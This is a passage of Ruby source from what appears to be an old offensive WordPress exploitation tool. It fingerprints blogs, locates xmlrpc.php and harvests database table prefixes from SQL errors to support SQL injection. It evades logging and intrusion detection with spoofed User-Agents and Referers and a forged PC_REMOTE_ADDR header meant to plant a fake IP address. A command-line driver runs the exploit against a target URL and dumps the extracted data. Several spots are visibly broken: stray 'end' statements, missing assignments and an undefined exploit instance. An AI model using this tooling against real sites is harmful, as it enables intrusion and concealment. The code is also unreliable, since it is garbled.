        phash      = Digest::MD5.new().hexdigest(phash)
        
        unless @site_cookie_hash
            res = Net::HTTP::Proxy(@proxy_host, @proxy_port).start(@url.host,
                                   @url.port) { |http|
                res = http.head(login_path, self.random_headers)
                if res and res["set-cookie"]
                    if c.length == 32
                        @site_cookie_hash = c
                    else
                        return nil
                    end
                end
            }
        end
        
        cookie.gsub!(/CHH/, @site_cookie_hash)
        return cookie = cookie.split(/;/)
    end
    
    # those SQL injection exploits that rely on valid permalinks or other types
    # of "standard" blog elements referring to internal content.
    def get_existing_tags()
        tag_list = []
        
        arr = @body.scan(/<a href="(.+?)" title="View all posts in (.+?)" rel="category tag">/)
        if arr and arr.size > 0
            i = 0
            arr.each do |link, tag|
                if tag and link
                    # link could be null, not an issue
                    tag_list[i] = { :tag => tag, :link => link }
                    i += 1
                end
            end
        end
        
        return tag_list
    end
    
    
    # disclosure bugs worked, use the default setting (wp or wp_svn for devel
    # builds).
    #
    # For now, methods available:
    # b) :db_error + 2.2.{1,0} edit-comments.php apage parameter bug
    #    requires enough privileges, leads to a SQL error with negative value
    #       WordPress database error: ... SELECT SQL_CALC_FOUND_ROWS * FROM
    #       wp_comments WHERE comment_approved = '0' OR comment_approved = '1'
    #       ORDER BY comment_date DESC LIMIT -40, 25
    #
        if method and str
            case method
                when :db_error
                     regex = /FROM (.+?)_(categories|users|posts|links|comments)/
                     end
                when :edit_coms_221
                     # Not implemented since it requires edit privileges.
                     # db_error method suffices almost always.
                else
            end
        else
            # Nothing worked, let's just guess it's default
        end
    end
    
    # Attempt to guess the correct xmlrpc.php path relative to base directory.
    # Most rewrite rules never bother changing this, therefore it shouldn't be
    # necessary to mess with this method. Add new checks if necessary.
    def get_xmlrpc_path()
        unless @xmlrpc_location 
            meta_regexp = /<link rel="pingback" href="(.*)\/(.*)" \/>/
            pingback = @body.scan(meta_regexp).flatten
            if pingback.size == 2
                meta_url = URI.parse(pingback[0])
                
                # Verify URL belongs to target host. Disable this if necessary. 
                if meta_url.host == @url.host
                    @xmlrpc_location = pingback[1]
                end
            else
                if remote_file_exists(@url.path + "xmlrpc.php")
                    @xmlrpc_location = "xmlrpc.php"
                else
                    # Nothing worked so far, out of luck.
                    return nil
                end 
            end
        end
        
        return @xmlrpc_location
    end
    
    #
    # Helpers and other utilities.
    #
    
    # Get the meta value of content found at path, using specified regexp
    # from the KNOWN_REGEXPS constant (by default)
    def get_meta_value(path, regexp, kregexp = KNOWN_REGEXPS)
        result = nil
        
        txt = retrieve_content(path)
        if txt
            kregexp[regexp].each do |rp|
              mvalue = txt.scan(rp).flatten[0]
              if mvalue
                result = { :str => mvalue, :buf => txt }
              end
            end
        end
        
        return result
    end
    
    # Add data to the results variable, available for read access to check
    # for information retrieved from successful exploitation.
    def add_to_results(bug, data_type, array)
        @results[bug] = { :data_type => data_type, :data => array}
    end
    
    # Add a message of given importance and desired information to the results
    # hash.
    def add_results_msg(owner, level, name, value)
        new_message = { level => { :response => name } }
        new_message[level][:description] = value
        add_to_results(owner, :messages, new_message)
    end
    
    # :nodoc: "Better than Nikto GET storm!" - a CISSP realizing HEAD exists.
    # Uses a HEAD request to check existence of a remote file. Uses random
    # headers.
    def remote_file_exists(path)
        does_exist = nil
        
        res = Net::HTTP::Proxy(@proxy_host, @proxy_port).start(@url.host,
                               @url.port) { |http|
           res = http.head(path, self.random_headers)
           case res
               when Net::HTTPSuccess, Net::HTTPRedirection
                   does_exist = true
               else
                   does_exist = false
           end
        }
        
        return does_exist
    end
    
    # Return a random User-Agent string from an array of the most popular ones :-)
    # (updated, August 2007). Do not add unusual/uncommon agents that stand out.
    def self.random_agent
        available_useragents = [
            "Googlebot/2.1 ( http://www.google.com/bot.html)",
            "msnbot/1.0 (+http://search.msn.com/msnbot.htm)",
            "Mozilla/5.0 (X11; U; Linux x86; en-US; rv:1.8.1.6) Gecko/20061201 Firefox/2.0.0.6 (Ubuntu-feisty)",
            "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6",
            "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0)",
            "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
            "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
            "Mozilla/5.0 (Windows; U; Windows NT 6.0; en) AppleWebKit/522.15.5 (KHTML, like Gecko) Version/3.0.3 Safari/522.15.5",
            "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/522.11.1 (KHTML, like Gecko) Version/3.0.3 Safari/522.12.1",
            "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en) AppleWebKit/523.2+ (KHTML, like Gecko) Version/3.0.3 Safari/522.12.1",
            "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.7.5) Gecko/20070321 Netscape/8.1.3",
            "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20070321 Netscape/9.0",
            "Opera/9.23 (Windows NT 5.0; U; en)"
        ]
        
        return available_useragents.rand_i
    end
    
    # Random IP address generator, this is used for generation of PC_REMOTE_ADDR
    # headers, since we want to leave a fake REMOTE_ADDR in the database record:
    # 
    #  if ( isset($_SERVER['HTTP_PC_REMOTE_ADDR']) )
    #     $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_PC_REMOTE_ADDR'];
    #
    # Optional argument determines the first block to use (ex. 17 = Apple :>)
    def self.random_ip(first_block = rand(254))
        return "#{first_block}.#{rand(254)}.#{rand(254)}.#{rand(254)}"
    end
    
    # Simply scans the body content for <a> elements and returns an array of
    # links. Useful for Referer spoofing, disguising as a normal visitor.
    def get_site_pages
        if @body
            return @body.scan(/<a href="(.*)"/).flatten
        else
            return nil
        end
    end
    
    # Return a hash of HTTP headers generated randomly. The goal is generating
    # non-homogeneous requests that contain static patterns.
    def random_headers
        rndheader = {}
        languages = [ "de-DE,en;q=0.5", "en-us,en;q=0.5", "en", "zh, en-us; q=0.6" ]
        rel_pages = get_site_pages()

        rndheader["Accept-Language"] = languages.rand_i
        if rel_pages
            rndheader["Referer"]    = rel_pages.rand_i
        end
        
        # Spoof REMOTE_ADDR, while this might be "covert" backend-wise, normal
        # headers would *never* contain this. this shouldn't work on OS X server
        # since the variable would be set server-side already. oh wait, I just
        # helped IDS vendors! :>
        if @covert_level > 1
        end
        
        return rndheader
    end
    
    # Returns array with the results.
    def get_valid_versions_array
        unless @wp_versions
            regexp = /<td align='center'><a href='(.+?)'>zip<\/a><\/td>/
            @wp_versions = [] # not nil, since we need self.index(version_to_check)
    
            archive = retrieve_content('', wp_url)
            if archive
                if tmp
                    @wp_versions = tmp.uniq
                end
            end
        end
    end
    
    # Send a XML-RPC request with data xml and path of xmlrpc.php at xmlrpc_path.
    # Returns the response body received from the server or nil if failed.
    # Uses random headers or given parameter (avoids recursion in some places).
    def send_xmlrpc(xml, xmlrpc_path)
        xml_response = ""
        
        res = Net::HTTP::Proxy(@proxy_host, @proxy_port).start(@url.host,
                               @url.port) { |http|
           res = http.post(@url.path + xmlrpc_path, xml, self.random_headers)
           case res
               when Net::HTTPSuccess, Net::HTTPRedirection
                   xml_response = res.body
               else
                   xml_response = nil
           end
        }
        
        return xml_response
    end
    
    # Sends a HTTP GET request to retrieve content available at specified
    # and path a file available within that directory).
    # Uses random headers.
    def retrieve_content(path, my_url = @url, headers = nil, return_res = false)
        body = ""
        
        res = Net::HTTP::Proxy(@proxy_host, @proxy_port).start(my_url.host,
                               my_url.port) { |http|
           if headers
               extra_headers = headers
           else
               extra_headers = self.random_headers
           end
           
           res = http.get(my_url.path + path, extra_headers)
           case res
               when Net::HTTPSuccess, Net::HTTPRedirection
                   body = res.body
               else
                   if return_res
                       body = res
                   else
                       body = nil
                   end
           end
        }
        
        return body
    end
end

if $0 != /666/
    require 'optparse'

    OPTIONS = {}
    
    def vputs(msg)
        if OPTIONS[:verbose]
            puts "+> #{msg}"
        end
    end

    if ARGV.size == 0
        puts "Psychic capabilities not yet implemented, sorry. Need arguments."
        exit
    end

    puts "> 'High quality antiblog guerrilla tools for the masses.'"
    puts "> (c) 2006, 2007 Lance M. Havok <lmh [at] info-pull.com>"
    
    # Let the Internet Hate Machine deliver:
    begin
        OptionParser.new do |opts|
            opts.banner = "Usage: #{$0} [options]"
            
            OPTIONS[:verbose]      = false
            OPTIONS[:fingerprint]  = true
            OPTIONS[:version]      = "auto" # by default, try to guess version
            OPTIONS[:proxy_host]   = nil    # if nil, default to direct conn
            OPTIONS[:proxy_port]   = nil    # if nil, default to direct conn
            OPTIONS[:username]     = nil
            OPTIONS[:password]     = nil
            OPTIONS[:covert_level] = 0      # by default, try everything.
            OPTIONS[:irb_shell]    = nil
            
            opts.on("--[no-]verbose", "Run verbosely") do |v|
                OPTIONS[:verbose] = v
            end
            
            opts.on("-t", "--target TARGET_URL", "Target URL (inc. WP path)") do |t|
                unless t =~ /(http|https):\/\/(.*)\//i
                    raise "Target must be in form: http(s)://domain.tld/wp/"
                end
                OPTIONS[:target] = t
            end
            
            opts.separator ""
            opts.separator "Optional and extra settings:"
            
            opts.on("-u", "--username USER", "Valid username") do |u|
                OPTIONS[:username] = u
            end
            
            opts.on("-p", "--password PASSWD", "Valid password for user") do |p|
                OPTIONS[:password] = p
            end
            
            opts.on("-v", "--version VERSION", "Target (full) version") do |n|
                OPTIONS[:version] = n
            end
            
            end
            
            opts.on("-c", "--covert LEVEL", "Covert level (0-2)") do |c|
                OPTIONS[:covert_level] = c
            end
            
            opts.on("-i", "--irb", "Execute an interactive IRB shell") do |i|
                OPTIONS[:irb_shell] = i
            end
            
            opts.on("--proxy HOST:PORT", "Use proxy at given host and port") do |p|
                unless p =~ /(.*):(.*)/i
                    raise "Proxy setting must be in form: host:port"
                end
                proxy = p.scan(/(.*):(.*)/i).flatten!
                OPTIONS[:proxy_host] = proxy[0]
                OPTIONS[:proxy_port] = proxy[1].to_i
            end
            
            opts.on("-f", "--[no-]fingerprint", "Disable fingerprinting") do |f|
                OPTIONS[:fingerprint] = false
            end
            
            opts.separator ""
        end.parse!
    rescue
        puts "> Please check arguments validity. See --help."
        puts "Error: " + $!
        exit
    end
    
    vputs "Settings:"
    vputs "  target:      #{OPTIONS[:target]}"
    vputs "  fingerprint: #{OPTIONS[:fingerprint]}"
    vputs "  wp version:  #{OPTIONS[:version]}"
    
    if OPTIONS[:proxy_host] and OPTIONS[:proxy_port]
        vputs "  proxy host:  #{OPTIONS[:proxy_host]}"
        vputs "  proxy port:  #{OPTIONS[:proxy_port]}"
    end
    if OPTIONS[:username] and OPTIONS[:password]
        vputs "  username:    #{OPTIONS[:username]}"
        vputs "  password:    #{OPTIONS[:password]}"
    end

    # Seek. Target. Deliver.
    begin
        
        if OPTIONS[:irb_shell]
            puts "> Executing interactive IRB shell, have fun."
            IRB.start
            puts "> Continuing..."
        end

        pwnInstance.exploit
        
        puts "> Finished. Dumping results, if any."
        if pwnInstance.results.size > 0
            puts ""
            pwnInstance.results.each do |r|
                $stderr.puts "-------------------- RESULTS: " + r[0].to_s
                $stderr.puts " Data type: " + r[1][:data_type].to_s
                $stderr.puts " Size:      " + r[1][:data].size.to_s
                
                # in a hash. We use a generic method to avoid code bloat and
                # do it as elegant as possible.
                r[1][:data].each do |n|
                    str = "\n" + (" " * 2) + n[0].to_s + "\n"
                    n[1].each do |i|
                        str << (" " * 3) + i[0].to_s
                        str << "\t : #{i[1].to_s}\n"
                    end
                    
                    $stderr.print(str)
                end
                puts ""
            end
        end
    rescue => e
        puts "> Error: #{e.message}"
        puts "> Ruby backtrace follows:"
        puts e.backtrace
    end
end



